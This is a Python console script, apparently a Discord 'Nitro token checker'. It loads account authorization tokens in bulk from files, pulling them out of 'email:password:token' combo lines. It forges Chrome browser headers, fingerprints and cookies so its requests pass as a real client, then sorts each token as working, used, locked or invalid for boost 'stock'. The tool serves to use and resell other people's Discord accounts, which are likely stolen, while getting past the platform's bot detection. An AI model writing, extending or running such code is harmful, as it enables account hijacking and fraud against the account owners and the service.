import json, os, httpx, base64, time, sys
from pathlib import Path
from colorama import Fore, init


red = Fore.RED
green = Fore.GREEN
white = Fore.WHITE
cyan = Fore.CYAN

def cls():
    os.system('cls' if os.name=='nt' else 'clear')



client_identifiers = ['safari_ios_16_0', 'safari_ios_15_6', 'safari_ios_15_5', 'safari_16_0', 'safari_15_6_1', 'safari_15_3', 'opera_90', 'opera_89', 'firefox_104', 'firefox_102']


        

def inputNumber(message):
    while True:
        try:
            userInput = int(input(message))
        except ValueError:
            print(red + "This value cannot be a string!" + white)
            continue
        else:
            return userInput
            break


def get_items(item):
    s = item[0]
    token = item[1]
    headers = item[2]
    profile = item[3]
    return s, token, headers, profile

def find_token(token):
    if ':' in token:
        token_chosen = None
        tokensplit = token.split(":")
        for thing in tokensplit:
            if '@' not in thing and '.' in thing and len(
                    thing) > 30:  
                token_chosen = thing
                break
        if token_chosen == None:
            print(f"Error finding token", Fore.RED)
            return None
        else:
            return token_chosen


    else:
        return token

def get_all_tokens(filename):
    all_tokens = []
    with open(filename, 'r') as f:
        for line in f.readlines():
            token = line.strip()
            token = find_token(token)
            if token != None:
                all_tokens.append(token)

    return all_tokens


def get_super_properties():
    properties = '''{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-GB","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","browser_version":"95.0.4638.54","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":102113,"client_event_source":null}'''
    properties = base64.b64encode(properties.encode()).decode()
    return properties

def get_fingerprint(s):
    try:
        fingerprint = s.get(f"https://discord.com/api/v9/experiments", timeout=5).json()["fingerprint"]
        return fingerprint
    except Exception as e:
        return "Error"

def get_cookies(s, url):
    try:
        cookieinfo = s.get(url, timeout=5).cookies
        dcf = str(cookieinfo).split('__dcfduid=')[1].split(' ')[0]
        sdc = str(cookieinfo).split('__sdcfduid=')[1].split(' ')[0]
        return dcf, sdc
    except:
        return "", ""

def get_proxy():
    pass


def get_headers(token):
    while True:
        s = httpx.Client(proxies=get_proxy())
        dcf, sdc = get_cookies(s, "https://discord.com/")
        fingerprint = get_fingerprint(s)
        if fingerprint != "Error":
            break
    super_properties = get_super_properties()
    headers = {
        'authority': 'discord.com',
        'method': 'POST',
        'path': '/api/v9/users/@me/channels',
        'scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'en-US',
        'authorization': token,
        'cookie': f'__dcfduid={dcf}; __sdcfduid={sdc}',
        'origin': 'https://discord.com',
        'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-fingerprint': fingerprint,
        'x-super-properties': super_properties,
    }
    return s, headers

def validate_token(s, headers):
    check = s.get(f"https://discord.com/api/v9/users/@me", headers=headers)
    if check.status_code == 200:
        profile_name = check.json()["username"]
        profile_discrim = check.json()["discriminator"]
        profile_of_user = f"{profile_name}#{profile_discrim}"
        return profile_of_user
    else:
        return False


def removeToken(token: str, file:str):
    with open(file, "r") as f:
        fulltokens = f.read().splitlines()
        Tokens = []
        for j in fulltokens:
            p = find_token(j)
            Tokens.append(p)
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open(file, "w").write("\n".join(Tokens))


def checkEmpty(file):
    mypath = Path(file)

    if mypath.stat().st_size == 0:
        return True
    else:
        return False


def stock():
    print(green + f"Token Stock: {len(open('tokens.txt', encoding='utf-8').read().splitlines())}")
    print(f"Boost Stock: {len(open('tokens.txt', encoding='utf-8').read().splitlines())*2}")
    time.sleep(7)
    cls()
    menu()


def nitrochecker():

    working = 0
    used = 0
    nonitro = 0
    invalid = 0
    locked = 0

    tokens = get_all_tokens("3m_tokens.txt")
    print("Checking 3 Months Nitro Tokens")

    if checkEmpty("tokens.txt"):
        print(red + "No Stock To Check" + white)

    else:
        for token in tokens:    
            file = "tokens.txt"
            s, headers = get_headers(token)
            profile = validate_token(s, headers)

            if profile != False:
                boost_data = s.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers={'Authorization': token})

                if boost_data.status_code == 403:
                    print(red + f" {white}{token} - {profile}{red} [LOCKED]" + white)
                    removeToken(token, file)
                    locked += 1
                if len(boost_data.json()) != 0 and boost_data.status_code == 200 or boost_data.status_code == 201:
                    if boost_data.json()[0]['cooldown_ends_at'] != None:
                        print(red + f" {white}{token} - {profile}{red} [USED]" + white)
                        removeToken(token, file)
                        used += 1
                if len(boost_data.json()) == 0:
                    removeToken(token, file)
                    print(f"{red} {white}{token} - {profile}{red} [NO NITRO]" + white)
                    nonitro += 1
                else:
                    if len(boost_data.json()) != 0 and boost_data.status_code == 200 or boost_data.status_code == 201:
                        if boost_data.json()[0]['cooldown_ends_at'] == None:

                            print(f"{green}{white}{token} - {profile}{green} [WORKING]" + white)
                            working += 1
            else:
                print(red + f"{white}{token}{red} [INVALID]" + white)
                removeToken(token, file)
                invalid += 1
   
    print(f"{green}Working Tokens: {white}{working}  |||  {red}Used Tokens: {white}{used}  |||  {red}No Nitro Tokens: {white}{nonitro}  |||  {red}Locked Tokens: {white}{locked}  |||  {red}Invalid Tokens: {white}{invalid}")





def menu():
    home = (cyan + f'''
    1. View Tokens
    2. Clear Tokens
    3. Check Tokens
    4. Exit
''' + white)
    for char in home:
        time.sleep(0.005)
        sys.stdout.write(char)
        sys.stdout.flush()

    choice = inputNumber(cyan + "> " + white)
    while choice != 1 and choice != 2 and choice != 3 and choice != 4 and choice != 5:
        print(red + "Only 4 choices are available." + white)
        choice = input(cyan + "> " + white)
    
    if choice == 1:
        stock()
    if choice == 2:
        open("tokens.txt", "w").write("")
        print(green + "Cleared tokens" + white)
        time.sleep(5)
        cls()
        menu()
    
    if choice == 3:
        nitrochecker()
        time.sleep(10)
        print()
        menu()
    if choice == 4:
        quit()

if __name__ == '__main__':

    cls()
    menu()
